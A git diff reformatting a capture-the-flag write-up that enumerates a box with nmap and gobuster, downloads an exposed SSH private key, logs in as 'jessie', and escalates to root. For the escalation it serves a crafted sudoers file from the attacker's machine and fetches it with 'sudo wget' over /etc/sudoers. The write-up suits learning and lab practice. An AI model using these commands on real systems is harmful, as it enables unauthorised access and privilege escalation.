@@ -12,7 +12,8 @@
 - Scan performed:
 
  ```bash 
-	nmap -sV -sC -oN nmap.txt TARGET_IP ```
+	nmap -sV -sC -oN nmap.txt TARGET_IP
+ ```
 - Open Ports: 
 	We can see immediately that ports 22 for SSH and port 80 for HTTP
 	In many assessments, when you see just these two, the most probable attack surface is the web service
@@ -24,13 +25,23 @@
 - Next up fired a gobuster scan at our target and found a hidden endpoint on /sitemap, before looking at anything cos I was too attached to my terminal at the time decided to fire another directory bust on the sitemap endpoint to further find anymore potential endpoints. 
 And I did - /sitemap/.ssh
 - I visited the endpointed to find an id_rsa file and everything went smooth sail from there
-- I quickly saved it on my computer using ```bash wget http://TARGET_IP/sitemap/.ssh/id_rsa ``` and then ran this command ```bash chmod 400 id_rsa```.
+- I quickly saved it on my computer using
+  ```bash
+   wget http://TARGET_IP/sitemap/.ssh/id_rsa
+    ```
+   and then ran this command
+  ```bash
+   chmod 400 id_rsa
+  ```
+This is to make the id_rsa file acceptable by ssh by securing the read and permissions to only you.
+
 Using this new found knowledge I went back to the other dude that was discovered by nmap
 
 ## Initial Access
 
 - Using the combo of the info we found earlier
-- I simply had to use the discovered username and private key to authenticate over SSH with: ```bash
+- I simply had to use the discovered username and private key to authenticate over SSH with:
+```bash
  ssh -i id_rsa jessie@TARGET_IP
 ``` 
 and boom, we're in 😁
@@ -42,15 +53,17 @@ and boom, we're in 😁
 	cat /proc/version
 	pwd
 ```
-- Now to get our user flag ```bash
+- Now to get our user flag
+```bash
  ls -R
 ```
 The flag was located in the Documents directory
 
 ## Privilege Escalation
-- I checked the commands Jessie could execute with elevated privileges ```text
+- I checked the commands Jessie could execute with elevated privileges
+```text
  sudo -l
- ```
+```
 We see that we can run wget command without a passwd as root
 
 - I got it wrong at first, stumbling in the dark and on GTFOBins.org for a privesc vector
@@ -60,17 +73,22 @@ I previously used sudo wget to try and read ```/etc/shadow``` but the hash I fou
 
 - Once that idea clicked, I headed over to my attackbox and 
 ```bash
- echo 'jessie ALL=(ALL:ALL) NOPASSWD: ALL' > payload' and then did ```bash python3 -m http.server 8000
+ echo 'jessie ALL=(ALL:ALL) NOPASSWD: ALL' > payload
+ python3 -m http.server 8000
 ```
-- Back on my target box I then abused the wget privileges by doing ```bash
+This would write our intended permissions(root) to a file name payload and then serve up our current directory containing that file over http on port 8000
+
+- Back on my target box I then abused the wget privileges by doing
+```bash
  sudo wget ATTACKBOX_IP:8000/payload -O /etc/sudoers
 ```
- This would overwrite Jessie's original permissions and give her basically root privileges without asking for a password each time
+ This would download our payload file over http and output it to the /etc/sudoers file. And because we're running this as root, we give ourselves the same permissions as root.
  And that was it, my permissions in the sudoers file were set in stone 😈😈
 - If we run the 
 ```bash
  sudo -l
- ``` command again, we can see that we now have access to do everything without a password as root.
+ ```
+ command again, we can see that we now have access to do everything without a password as root.
 - If we wanted we could simply su to root without a password, change root password or just simply look into /root to find our flag waiting for us to cat it out
 
 ## Attack Chain
